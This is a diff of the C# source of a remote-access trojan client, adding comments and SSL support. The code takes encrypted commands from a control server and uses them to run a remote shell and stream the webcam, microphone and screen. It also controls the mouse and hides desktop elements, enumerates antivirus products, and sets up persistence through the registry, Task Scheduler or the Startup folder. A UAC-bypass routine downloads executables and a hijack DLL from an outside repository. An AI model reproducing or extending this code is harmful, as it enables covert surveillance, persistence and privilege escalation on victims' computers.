+                StartIPCHandler(); //Start the handler
+                LaunchIPCChild(servername); //Launch the child process
             }
 
-            if (text.StartsWith("stopipc§"))
+            if (text.StartsWith("stopipc§")) //Stop IPC connections
             {
-                StopIPCHandler();
+                StopIPCHandler(); //Disconnect from the IPC server
             }
 
-            if (text == "countScreens")//-----------------added this to count the screens and send response to server
+            if (text == "countScreens") //Get the available screens on the machine
             {
 
-                foreach (var screen in Screen.AllScreens)
+                foreach (var screen in Screen.AllScreens) //Loop through screens
                 {
-                    getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", "");
+                    getScreens = screen.DeviceName.Replace("\\\\.\\DISPLAY", ""); //Get the ID of the screen
 
-                    sendCommand("ScreenCount" + getScreens);
+                    SendCommand("ScreenCount" + getScreens); //Send the screen ID to the server
                 }
             }
 
-            if (text.StartsWith("screenNum"))//----------this will set the screen else is equal to screen 0
+            if (text.StartsWith("screenNum")) //Set the screen ID to view during the remote desktop session
             {
                 int screenNumbers = int.Parse(text.Replace("screenNum", "")) - 1; //because the screens start at 0 not 1 
-                ScreenNumber = screenNumbers;
+                ScreenNumber = screenNumbers; //Set the screen number
                 Console.WriteLine(ScreenNumber.ToString());
             }
 
-            if (text.StartsWith("sprobe§"))
+            if (text.StartsWith("sprobe§")) //Probe startup options
             {
-                string method = text.Split('§')[1];
-                UAC.ProbeMethod pm = UAC.ProbeMethod.StartUpFolder;
+                string method = text.Split('§')[1]; //Get the probing method
+                UAC.ProbeMethod pm = UAC.ProbeMethod.StartUpFolder; //Declare a probing method
 
+                //Parse the method to use
                 if (method == "Registry") pm = UAC.ProbeMethod.Registry;
                 else if (method == "Task Scheduler") pm = UAC.ProbeMethod.TaskScheduler;
                 else if (method == "Startup Folder") pm = UAC.ProbeMethod.StartUpFolder;
                 else return;
 
-                UAC uac = new UAC();
-                uac.ProbeStart(pm);
+                UAC uac = new UAC(); //Create a new UAC module
+                uac.ProbeStart(pm); //Probe the startup using the selected method
             }
         }
 
-        //ReceiveResponse
-
+        /// <summary>
+        /// Read data from the server
+        /// </summary>
         private static void ReceiveResponse()
         {
 
-            var buffer = new byte[2048];
+            var buffer = new byte[2048]; //The receive buffer
           
             try
             {
-                int received = _clientSocket.Receive(buffer, SocketFlags.None);
-                if (received == 0) return;
-                var data = new byte[received];
-                Array.Copy(buffer, data, received);
+                int received = 0;
+                if (!IsLinuxServer) received = _clientSocket.Receive(buffer, SocketFlags.None); //Receive data from the server
+                else received = _sslClient.Read(buffer, 0, 2048);
+                if (received == 0) return; //If failed to received data return
+                var data = new byte[received]; //Create a new buffer with the exact data size
+                Array.Copy(buffer, data, received); //Copy from the receive to the exact size buffer
 
-                if (isFileDownload)
+                if (isFileDownload) //File download is in progress
                 {
-                    Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length);
+                    Buffer.BlockCopy(data, 0, recvFile, writeSize, data.Length); //Copy the file data to memory
 
-                    writeSize += data.Length;
+                    writeSize += data.Length; //Increment the received file size
 
                     if (writeSize == fup_size) //prev. recvFile.Length == fup_size
                     {
@@ -1306,65 +1545,70 @@ namespace TutClient
                         }
 
                         Array.Clear(recvFile, 0, recvFile.Length);
-                        sendCommand("frecv");
+                        SendCommand("frecv");
                         writeSize = 0;
                         isFileDownload = false;
                         return;
                     }
                 }
 
-                if (!isFileDownload)
+                if (!isFileDownload) //Not downloading files
                 {
-                    string text = Encoding.Unicode.GetString(data); //unicode
-                    string[] commands = GetCommands(text);
-                    //text = Decrypt(text); //edit
+                    string text = (!IsLinuxServer) ? Encoding.Unicode.GetString(data) : Encoding.UTF8.GetString(data); //Convert the data to unicode string
+                    string[] commands = GetCommands(text); //Get command of the message
 
                     Console.WriteLine(text);
 
-                    foreach (string cmd in commands)
+                    foreach (string cmd in commands) //Loop through the commands
                     {
-                        HandleCommand(Decrypt(cmd));
+                        HandleCommand(Decrypt(cmd)); //Decrypt and execute the command
                     }
                 }
             }
-            catch (Exception ex)
+            catch (Exception ex) //Somethind went wrong
             {
                 Console.WriteLine(ex.Message);
-                RDesktop.isShutdown = true;
+                RDesktop.isShutdown = true; //Stop streaming remote desktop
                 Console.WriteLine("Connection ended");
             }
         }
 
-        private static void source_NewFrame(object sender, NewFrameEventArgs e)
+        /// <summary>
+        /// Handle camera imagage frames
+        /// </summary>
+        /// <param name="sender">The sender of the event</param>
+        /// <param name="e">Frame Event Arguments</param>
+        private static void Source_NewFrame(object sender, NewFrameEventArgs e)
         {
             try
             {
-                System.Drawing.Bitmap cam = (System.Drawing.Bitmap)e.Frame.Clone();
+                Bitmap cam = (Bitmap)e.Frame.Clone(); //Get the frame of the camera
 
-                System.Drawing.ImageConverter convert = new System.Drawing.ImageConverter();
-                byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(Byte[]));
-                byte[] send = new byte[camBuffer.Length + 16];
-                byte[] header = Encoding.Unicode.GetBytes("wcstream");
-                Buffer.BlockCopy(header, 0, send, 0, header.Length);
-                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length);
+                ImageConverter convert = new ImageConverter(); //Create a new image converter
+                byte[] camBuffer = (byte[])convert.ConvertTo(cam, typeof(Byte[])); //Convert the image to bytes
+                byte[] send = new byte[camBuffer.Length + 16]; //Create a new buffer for the command
+                byte[] header = Encoding.Unicode.GetBytes("wcstream"); //Get the bytes of the header
+                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
+                Buffer.BlockCopy(camBuffer, 0, send, header.Length, camBuffer.Length); //Copy the image to the main buffer
                 Console.WriteLine("Size of send: " + send.Length);
-                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
+                _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send the frame to the server
+                //Wait for send and dispose the image
                 Application.DoEvents();
-                Thread.Sleep(200); //this was 500
+                Thread.Sleep(200);
                 cam.Dispose();
             }
-            catch (Exception)
+            catch (Exception) //Something went wrong
             {
                 try
                 {
                     Console.WriteLine("Connection Ended");
                     Thread.Sleep(3000);
-                    isDisconnect = true;
+                    isDisconnect = true; //Disconnect from the server
                     
                 }
-                catch (Exception exc)
+                catch (Exception exc) //Something went really wrong
                 {
-                    
+                    //Restart the whole application
                     Console.WriteLine("Failed to send New Frame  original ERROR : " + exc.Message);
                     Thread.Sleep(10000);
                     Application.Restart();
@@ -1373,42 +1617,51 @@ namespace TutClient
             }
         }
 
-        private static void sendAudio(object sender, NAudio.Wave.WaveInEventArgs e)
+        /// <summary>
+        /// Handle audio data from microphone
+        /// </summary>
+        /// <param name="sender">The sender of the event</param>
+        /// <param name="e">The Audio event arguments</param>
+        private static void SendAudio(object sender, NAudio.Wave.WaveInEventArgs e)
         {
-            byte[] rawAudio = e.Buffer;
+            byte[] rawAudio = e.Buffer; //Get the buffer of the audio
             Console.WriteLine("Size of the audio: " + rawAudio.Length);
-            byte[] send = new byte[rawAudio.Length + 16];
-            byte[] header = Encoding.Unicode.GetBytes("austream");
-            Buffer.BlockCopy(header, 0, send, 0, header.Length);
-            Buffer.BlockCopy(rawAudio, 0, send, header.Length, rawAudio.Length);
+            byte[] send = new byte[rawAudio.Length + 16]; //Create a new buffer to send to the server
+            byte[] header = Encoding.Unicode.GetBytes("austream"); //Get the bytes of the header
+            Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
+            Buffer.BlockCopy(rawAudio, 0, send, header.Length, rawAudio.Length); //Copy the audio data to the main buffer
             Console.WriteLine("Size of send: " + send.Length);
-            _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
+            _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send audio data to the server
         }
 
+        /// <summary>
+        /// Send desktop screen to the server
+        /// </summary>
+        /// <param name="img">The image to send as bytes</param>
         public static void SendScreen(byte[] img)
         {
             try
             {
                 Console.WriteLine("Size of the image: " + img.Length);
-                byte[] send = new byte[img.Length + 16];
-                byte[] header = Encoding.Unicode.GetBytes("rdstream");
-                Buffer.BlockCopy(header, 0, send, 0, header.Length);
-                Buffer.BlockCopy(img, 0, send, header.Length, img.Length);
+                byte[] send = new byte[img.Length + 16]; //Create a new buffer to send to the server
+                byte[] header = Encoding.Unicode.GetBytes("rdstream"); //Get the bytes of the header
+                Buffer.BlockCopy(header, 0, send, 0, header.Length); //Copy the header to the main buffer
+                Buffer.BlockCopy(img, 0, send, header.Length, img.Length); //Copy the image to the main buffer
                 Console.WriteLine("Size of send: " + send.Length);
-                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
+                _clientSocket.Send(send, 0, send.Length, SocketFlags.None); //Send the image to the server
             }
-            catch (Exception)
+            catch (Exception) //Something went wrong
             {
                 try
                 {
                     Console.WriteLine("Connection Ended");
                     Thread.Sleep(3000);
-                    isDisconnect = true;
+                    isDisconnect = true; //Disconnect from server
 
                 }
-                catch (Exception exc)
+                catch (Exception exc) //Something went really wrong
                 {
-
+                    //Restart the application
                     Console.WriteLine("Failed to send Screen  original ERROR : " + exc.Message);
                     Thread.Sleep(10000);
                     Application.Restart();
@@ -1417,23 +1670,30 @@ namespace TutClient
             }
         }
 
+        /// <summary>
+        /// Handle a mouse click event from the server
+        /// </summary>
+        /// <param name="button">The button to manipulate</param>
+        /// <param name="direction">Press down or release action</param>
         private static void MouseEvent(string button, string direction)
         {
+            //Get the current position of the mouse
             int X = Cursor.Position.X;
             int Y = Cursor.Position.Y;
 
+            //Check and handle button press or release
             switch (button)
             {
                 case "left":
                     if (direction == "up")
                     {
-                        mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
+                        Mouse_eventLeftUP(MouseEventFlags.LEFTUP, X, Y, 0, 0);
                         Console.WriteLine("mouseevent leftup");
                     }
 
                     else
                     {
-                        mouse_eventLeftDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
+                        Mouse_eventLeftDown(MouseEventFlags.LEFTDOWN, X, Y, 0, 0);
                         Console.WriteLine("mouseevent leftdown");
                     }
 
@@ -1442,7 +1702,7 @@ namespace TutClient
                 case "right":
                     if (direction == "up")
                     {
-                        mouse_eventRightUP(MouseEventFlags.RIGHTUP, X, Y, 0, 0);
+                        Mouse_eventRightUP(MouseEventFlags.RIGHTUP, X, Y, 0, 0);
                         Console.WriteLine("mouseevent rightup");
                     }
 
@@ -1456,31 +1716,68 @@ namespace TutClient
             }
         }
 
-        private static void mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        /// <summary>
+        /// Release the left
+        /// </summary>
+        /// <param name="lEFTUP">Mouse event code</param>
+        /// <param name="x">The mouse X position on the screen</param>
+        /// <param name="y">The mouse Y position on the screen</param>
+        /// <param name="v1"></param>
+        /// <param name="v2"></param>
+        private static void Mouse_eventLeftUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
             Cursor.Position = new Point(x, y);    
-            mouse_event((int)(MouseEventFlags.LEFTUP), 0, 0, 0, 0);  
+            mouse_event((int)(MouseEventFlags.LEFTUP), x, y, v1, v2);  
         }
 
-        private static void mouse_eventLeftDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        /// <summary>
+        /// Press down the left mouse button
+        /// </summary>
+        /// <param name="lEFTUP">Mouse event code</param>
+        /// <param name="x">The mouse X position on the screen</param>
+        /// <param name="y">The mouse Y position on the screen</param>
+        /// <param name="v1"></param>
+        /// <param name="v2"></param>
+        private static void Mouse_eventLeftDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
             Cursor.Position = new Point(x, y);
-            mouse_event((int)(MouseEventFlags.LEFTDOWN), 0, 0, 0, 0);
-          
+            mouse_event((int)(MouseEventFlags.LEFTDOWN), x, y, v1, v2);
         }
 
-        private static void mouse_eventRightUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
+        /// <summary>
+        /// Release the right mouse button
+        /// </summary>
+        /// <param name="lEFTUP">Mouse event code</param>
+        /// <param name="x">The mouse X position on the screen</param>
+        /// <param name="y">The mouse Y position on the screen</param>
+        /// <param name="v1"></param>
+        /// <param name="v2"></param>
+        private static void Mouse_eventRightUP(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
             Cursor.Position = new Point(x, y);
-            mouse_event((int)(MouseEventFlags.RIGHTUP), 0, 0, 0, 0);
+            mouse_event((int)(MouseEventFlags.RIGHTUP), x, y, v1, v2);
         }
 
+        /// <summary>
+        /// Press down the right mouse button
+        /// </summary>
+        /// <param name="lEFTUP">Mouse event code</param>
+        /// <param name="x">The mouse X position on the screen</param>
+        /// <param name="y">The mouse Y position on the screen</param>
+        /// <param name="v1"></param>
+        /// <param name="v2"></param>
         private static void mouse_eventRightDown(MouseEventFlags lEFTUP, int x, int y, int v1, int v2)
         {
             Cursor.Position = new Point(x, y);
-            mouse_event((int)(MouseEventFlags.RIGHTDOWN), 0, 0, 0, 0);
+            mouse_event((int)(MouseEventFlags.RIGHTDOWN), x, y, v1, v2);
         }
 
+        /// <summary>
+        /// Copy a directory
+        /// </summary>
+        /// <param name="sourceDirName">The directory to copy</param>
+        /// <param name="destDirName">The directory to copy to</param>
+        /// <param name="copySubDirs">True if recursive, otherwise false</param>
         private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs)
         {
             // Get the subdirectories for the specified directory.
@@ -1519,6 +1816,12 @@ namespace TutClient
             }
         }
 
+        /// <summary>
+        /// Move directory
+        /// </summary>
+        /// <param name="sourceDirName">The directory to copy</param>
+        /// <param name="destDirName">The directory to copy to</param>
+        /// <param name="copySubDirs">True if recursive, otherwise false</param>
         private static void DirectoryMove(string sourceDirName, string destDirName, bool copySubDirs)
         {
             // Get the subdirectories for the specified directory.
@@ -1562,42 +1865,48 @@ namespace TutClient
             }
         }
 
-        private static void getShellInput()
+        /// <summary>
+        /// Read output from the remote cmd module
+        /// </summary>
+        private static void GetShellInput()
         {
-            Console.WriteLine("getShellInput()");
             try
             {
+                //Declare output data variables
                 String tempBuf = "";
                 String tempError = "";
                 String edata = "";
                 string sdata = "";
-                while ((tempBuf = fromShell.ReadLine()) != null)
+                while ((tempBuf = fromShell.ReadLine()) != null) //Read from the cmd output
                 {
                     sdata = sdata + tempBuf + "\r";
                     Console.WriteLine("SData: " + @sdata);
                     Console.WriteLine("TempBuf: " + @tempBuf);
                     sdata = sdata.Replace("cmdout", String.Empty);
-                    sendCommand("cmdout§" + sdata, true);
+                    SendCommand("cmdout§" + sdata, true);
                     sdata = "";
                 }
 
-                while ((tempError = error.ReadLine()) != null)
+                while ((tempError = error.ReadLine()) != null) //Read data from cmd error output
                 {
                     edata = edata + tempError + "\r";
-                    sendCommand("cmdout§" + edata, true);
+                    SendCommand("cmdout§" + edata, true);
                     edata = "";
                 }
 
             }
-            catch (Exception ex)
+            catch (Exception ex) //Something went wrong
             {
-                sendCommand("cmdout§Error reading cmd response: \n" + ex.Message, true);
-                reportError(errorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!");
+                SendCommand("cmdout§Error reading cmd response: \n" + ex.Message, true); //Send message to remote cmd window
+                ReportError(ErrorType.CMD_STREAM_READ, "Can't read stream!", "Remote Cmd stream reading failed!"); //Report error to the server
             }
 
         }
 
-        public static void hClock()
+        /// <summary>
+        /// Hide the clock
+        /// </summary>
+        public static void HClock()
         {
             int hwnd = 0;
             ShowWindow(
@@ -1606,7 +1915,10 @@ namespace TutClient
               SW_HIDE);
         }
 
-        public static void sClock()
+        /// <summary>
+        /// Show the clock
+        /// </summary>
+        public static void SClock()
         {
             int hwnd = 0;
             ShowWindow(
@@ -1615,27 +1927,42 @@ namespace TutClient
               SW_SHOW);
         }
 
-        public static void hTaskBar()
+        /// <summary>
+        /// Hide the task bar
+        /// </summary>
+        public static void HTaskBar()
         {
             ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
         }
 
-        public static void sTaskBar()
+        /// <summary>
+        /// Show the task bar
+        /// </summary>
+        public static void STaskBar()
         {
             ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
         }
 
-        public static void hDesktop()
+        /// <summary>
+        /// Hide desktop icons
+        /// </summary>
+        public static void HDesktop()
         {
             ShowWindow(FindWindow(null, "Program Manager"), SW_HIDE);
         }
 
-        public static void sDesktop()
+        /// <summary>
+        /// Show desktop icons
+        /// </summary>
+        public static void SDesktop()
         {
             ShowWindow(FindWindow(null, "Program Manager"), SW_SHOW);
         }
 
-        public static void hTrayIcons()
+        /// <summary>
+        /// Hide tray icons
+        /// </summary>
+        public static void HTrayIcons()
         {
             int hwnd = 0;
             ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
@@ -1643,7 +1970,10 @@ namespace TutClient
                             SW_HIDE);
         }
 
-        public static void sTrayIcons()
+        /// <summary>
+        /// Show tray icons
+        /// </summary>
+        public static void STrayIcons()
         {
             int hwnd = 0;
             ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null),
@@ -1651,42 +1981,59 @@ namespace TutClient
                             SW_SHOW);
         }
 
-        public static void hStart()
+        /// <summary>
+        /// Hide start button (Only on XP)
+        /// </summary>
+        public static void HStart()
         {
             ShowWindow(FindWindow("Button", null), SW_HIDE);
         }
 
-        public static void sStart()
+        /// <summary>
+        /// Show start button
+        /// </summary>
+        public static void SStart()
         {
             ShowWindow(FindWindow("Button", null), SW_SHOW);
         }
 
-        private static void t2s(string stext)
+        /// <summary>
+        /// Text to speech
+        /// </summary>
+        /// <param name="stext">The text to read out</param>
+        private static void T2S(string stext)
         {
-            using (System.Speech.Synthesis.SpeechSynthesizer speech = new System.Speech.Synthesis.SpeechSynthesizer()) //---------use this instead
-
+            using (System.Speech.Synthesis.SpeechSynthesizer speech = new System.Speech.Synthesis.SpeechSynthesizer()) //Create a new text reader
             {
-                speech.SetOutputToDefaultAudioDevice();
-
-                speech.Speak(stext);
-                // speech.Speak("hello");
-
+                speech.SetOutputToDefaultAudioDevice(); //Set the output device
+                speech.Speak(stext); //Read the text
             }
         }
 
-        private static void generateFreq(int freq, int duration)
+        /// <summary>
+        /// Play a frequency
+        /// </summary>
+        /// <param name="freq">The frequncy to play</param>
+        /// <param name="duration">The duration of the frequency to play</param>
+        private static void GenerateFreq(int freq, int duration)
         {
-            Console.Beep(freq, duration * 1000);
+            Console.Beep(freq, duration * 1000); //Play the frequency
         }
 
-        private static void createMessage(String[] info)
+        /// <summary>
+        /// Create and display a message box
+        /// </summary>
+        /// <param name="info">The string info sent by the server</param>
+        private static void CreateMessage(String[] info)
         {
-            String title = info[1];
-            String text = info[2];
-            String icon = info[3];
-            String button = info[4];
+            String title = info[1]; //Get the title
+            String text = info[2]; //Get the prompt text
+            String icon = info[3]; //Get the icon
+            String button = info[4]; //Get the buttons
             MessageBoxIcon ico = MessageBoxIcon.None;
             MessageBoxButtons btn = MessageBoxButtons.OK;
+
+            //Parse the icon and buttons data
 
             switch (icon)
             {
@@ -1734,47 +2081,63 @@ namespace TutClient
                     break;
             }
 
-            MessageBox.Show(text, title, btn, ico);
+            MessageBox.Show(text, title, btn, ico); //Display the message box
         }
 
+        /// <summary>
+        /// Get the IPv4 address of the local machine
+        /// </summary>
+        /// <returns>The IPv4 address of the machine</returns>
         public static string GetLocalIPAddress()
         {
-            var host = Dns.GetHostEntry(Dns.GetHostName());
-            foreach (var ip in host.AddressList)
+            var host = Dns.GetHostEntry(Dns.GetHostName()); //Get our ip addresses
+            foreach (var ip in host.AddressList) //Go through the addresses
             {
-                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                if (ip.AddressFamily == AddressFamily.InterNetwork) //If address is inet
                 {
-                    return ip.ToString();
+                    return ip.ToString(); //Return the ip of the machine
                 }
             }
-            return "N/A";
+            return "N/A"; //IP not found at this point
         }
 
+        /// <summary>
+        /// Get the Anti-Virus product name of the machine
+        /// </summary>
+        /// <returns>The name of the installed AV product</returns>
         public static string AvName()
         {
-            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
-            var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
-            var instances = searcher.Get();
-            string av = "";
-            foreach (var instance in instances)
+            string wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2"; //Create the WMI path
+            var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct"); //Create a search query
+            var instances = searcher.Get(); //Search the database
+            string av = ""; //The name of the AV product
+            foreach (var instance in instances) //Go through the results
             {
                 Console.WriteLine(instance.GetPropertyValue("displayName"));
-                av = instance.GetPropertyValue("displayName").ToString();
+                av = instance.GetPropertyValue("displayName").ToString(); //Get the name of the AV
             }
 
-            if (av == "") av = "N/A";
+            if (av == "") av = "N/A"; //If AV name isn't found return this
 
-            return av;
+            return av; //Return the name of the installed AV Product
         }
 
+        /// <summary>
+        /// Encrypt data
+        /// </summary>
+        /// <param name="clearText">The message to encrypt</param>
+        /// <returns>The encrypted Base64 CipherText</returns>
         public static string Encrypt(string clearText)
         {
+            if (IsLinuxServer) return clearText;
+
             try
             {
-                string EncryptionKey = "MAKV2SPBNI99212";
-                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
-                using (Aes encryptor = Aes.Create())
+                string EncryptionKey = "MAKV2SPBNI99212"; //Encryption key
+                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText); //Bytes of the message
+                using (Aes encryptor = Aes.Create()) //Create a new AES decryptor
                 {
+                    //Encrypt the data
                     Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                     encryptor.Key = pdb.GetBytes(32);
                     encryptor.IV = pdb.GetBytes(16);
@@ -1789,24 +2152,31 @@ namespace TutClient
                         clearText = Convert.ToBase64String(ms.ToArray());
                     }
                 }
-                return clearText;
+                return clearText; //Return the encrypted text
             }
-            catch (Exception)
+            catch (Exception) //Something went wrong
             {
-                reportError(errorType.ENCRYPT_DATA_CORRUPTED, "Can't encrypt message!", "Message encryption failed!");
-                return clearText;
+                ReportError(ErrorType.ENCRYPT_DATA_CORRUPTED, "Can't encrypt message!", "Message encryption failed!"); //Report error to server
+                return clearText; //Send the plain text data
             }
         }
 
+        /// <summary>
+        /// Decrypt encrypted data
+        /// </summary>
+        /// <param name="cipherText">The data to decrypt</param>
+        /// <returns>The plain text message</returns>
         public static string Decrypt(string cipherText)
         {
+            if (IsLinuxServer) return cipherText;
+
             try
             {
                 string EncryptionKey = "MAKV2SPBNI99212"; //this is the secret encryption key  you want to hide dont show it to other guys
-                byte[] cipherBytes = Convert.FromBase64String(cipherText);
-                //Console.WriteLine("Encrypted Cipher Text: " + cipherText);
-                using (Aes encryptor = Aes.Create())
+                byte[] cipherBytes = Convert.FromBase64String(cipherText); //Get the encrypted message's bytes
+                using (Aes encryptor = Aes.Create()) //Create a new AES object
                 {
+                    //Decrypt the text
                     Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                     encryptor.Key = pdb.GetBytes(32);
                     encryptor.IV = pdb.GetBytes(16);
@@ -1820,179 +2190,249 @@ namespace TutClient
                         cipherText = Encoding.Unicode.GetString(ms.ToArray());
                     }
                 }
-                return cipherText;
+                return cipherText; //Return the plain text data
             }
-            catch (Exception ex)
+            catch (Exception ex) //Something went wrong
             {
                 Console.WriteLine(ex.Message);
                 Console.WriteLine("Cipher Text: " + cipherText);
-                reportError(errorType.DECRYPT_DATA_CORRUPTED, "Can't decrypt message!", "Message decryption failed!");
-                return "error";
+                ReportError(ErrorType.DECRYPT_DATA_CORRUPTED, "Can't decrypt message!", "Message decryption failed!"); //Report error to the server
+                return "error"; //Return error
             }
         }
 
-        private static void sendCommand(String response, bool isCmd = false)
+        /// <summary>
+        /// Send data to the server
+        /// </summary>
+        /// <param name="response">The data to send</param>
+        /// <param name="isCmd">If remote cmd is sending the data</param>
+        private static void SendCommand(String response, bool isCmd = false)
         {
-            if (!_clientSocket.Connected)
+            if (!_clientSocket.Connected) //If the client isn't connected
             {
                 Console.WriteLine("Socket is not connected!");
-                return;
+                return; //Return
             }
             String k = response;
 
-            String crypted = Encrypt(k);
-            if (isCmd) crypted = k;
-            byte[] data = Encoding.Unicode.GetBytes(crypted);
-            // _clientSocket.Send(data);
+            String crypted = Encrypt(k); //Encrypt the data
+            if (isCmd) crypted = k; //If sending remote cmd data then send it in plain text
+            if (IsLinuxServer) crypted = SSLFormatCommand(crypted);
+            byte[] data = (!IsLinuxServer) ? Encoding.Unicode.GetBytes(crypted) : Encoding.UTF8.GetBytes(crypted); //Get the bytes of the encrypted data
+
             try
             {
-                _clientSocket.Send(data);  //-added this as sometimes the tcp was not finished sending when it was asked to close the stream
+                if (!IsLinuxServer)
+                {
+                    _clientSocket.Send(data); //Send the data to the server
+                }
+                else _sslClient.Write(data);
             }
-            catch (Exception ex)
+            catch (Exception ex) //Failed to send data to the server
             {
                 Console.WriteLine("Send Command Failure " + ex.Message);
-                return;//added this too
+                return; //Return
             }
         }
 
-        private static void sendByte(byte[] data)
+        private static string SSLFormatCommand(string command)
         {
-            if (!_clientSocket.Connected)
+            command = command.Replace("\\", "\\\\");
+            string cmdLength = command.Length.ToString();
+            const string pattern = "!??!%";
+            return $"{cmdLength}{pattern}{command}";
+        }
+
+        /// <summary>
+        /// Send raw bytes to the server
+        /// </summary>
+        /// <param name="data">The byte data to send</param>
+        private static void SendByte(byte[] data)
+        {
+            if (!_clientSocket.Connected) //If the client isn't connected
             {
                 Console.WriteLine("Socket is not connected!");
-                return;
+                return; //Return
             }
-            // _clientSocket.Send(data);
+
             try
             {
-                _clientSocket.Send(data);
+                if (!IsLinuxServer) _clientSocket.Send(data); //Send bytes to the server
+                else _sslClient.Write(data);
             }
-            catch (Exception ex)
+            catch (Exception ex) //Failed to send data to server
             {
                 Console.WriteLine("Send Byte Failure " + ex.Message);
-                return;
+                return; //Return
             }
 
         }
     }
 
+    /// <summary>
+    /// The UAC / Persistence module
+    /// </summary>
     public class UAC
     {
+        /// <summary>
+        /// Create a new shortcut file
+        /// </summary>
+        /// <param name="targetFile">The shortcut file's path</param>
+        /// <param name="linkedFile">The file to point the shortcut to</param>
         private void CreateShortcut(string targetFile, string linkedFile)
         {
             try
             {
-                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshRuntimeLibrary.IWshShell_Class();
-                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut) wsh.CreateShortcut(targetFile);
-                shortcut.TargetPath = linkedFile;
-                shortcut.WorkingDirectory = Application.StartupPath;
-                shortcut.Save();
+                IWshRuntimeLibrary.IWshShell_Class wsh = new IWshRuntimeLibrary.IWshShell_Class(); //Get a new shell
+                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut) wsh.CreateShortcut(targetFile); //Create the shortcut object
+                shortcut.TargetPath = linkedFile; //Set the target path
+                shortcut.WorkingDirectory = Application.StartupPath; //Set the working directory important!!
+                shortcut.Save(); //Save the object (write to disk)
                 Console.WriteLine("Shortcut created");
             }
-            catch (Exception ex)
+            catch (Exception ex) //Failed to create shortcut
             {
                 Console.WriteLine("Error creating shortcut: " + ex.Message);
             }
         }
 
+        /// <summary>
+        /// Auto download the UAC bypass toolkit
+        /// </summary>
+        /// <returns>The progress of the bypass</returns>
         public IEnumerable<int> AutoLoadBypass()
         {
             //I am not responsible for any damage done! And i am not spreading the malware, using it is optional!
-            const string link64 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x64%20bit/";
-            const string link86 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x86%20bit/";
-            const string unattendFile = "https://raw.githubusercontent.com/AdvancedHacker101/Bypass-Uac/master/unattend.xml";
-            string[] filesToLoad = { "copyFile.exe", "testAnything.exe", "testDll.dll" };
-            string[] localName = { "copyFile.exe", "launch.exe", "dismcore.dll" };
-            bool is64 = Is64Bit();
-            string link = "";
-            if (is64) link = link64;
-            else link = link86;
-            int index = 0;
-            WebClient wc = new WebClient();
+            const string link64 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x64%20bit/"; //Directory to 64 bit version
+            const string link86 = "https://github.com/AdvancedHacker101/Bypass-Uac/raw/master/Compiled/x86%20bit/"; //Driectroy to 32 bit verion
+            const string unattendFile = "https://raw.githubusercontent.com/AdvancedHacker101/Bypass-Uac/master/unattend.xml"; //The unattend file
+            string[] filesToLoad = { "copyFile.exe", "testAnything.exe", "testDll.dll" }; //Remote file names to download
+            string[] localName = { "copyFile.exe", "launch.exe", "dismcore.dll" }; //Local file names to save the remote files to
+            bool is64 = Is64Bit(); //Get if the system is x64
+            string link = ""; //The root link to use
+            if (is64) link = link64; //Use the x64 link
+            else link = link86; //Use the x86 link
+            int index = 0; //Index counter
+            WebClient wc = new WebClient(); //Create a new web-client
 
-            foreach (string file in filesToLoad)
+            foreach (string file in filesToLoad) //go through the remote files
             {
-                wc.DownloadFile(link + file, Application.StartupPath + "\\" + localName[index]);
-                index++;
-                yield return 25;
+                wc.DownloadFile(link + file, Application.StartupPath + "\\" + localName[index]); //Download the remote file
+                index++; //Increment the index
+                yield return 25; //Return a 25% increase in the progress
             }
 
-            wc.DownloadFile(unattendFile, Application.StartupPath + "\\unattend.xml");
-            yield return 25;
+            wc.DownloadFile(unattendFile, Application.StartupPath + "\\unattend.xml"); //Download the unattend file
+            yield return 25; //Return a 25% increase in the progress
         }
 
+        /// <summary>
+        /// The methods to use when probing statup
+        /// </summary>
         public enum ProbeMethod
         {
+            /// <summary>
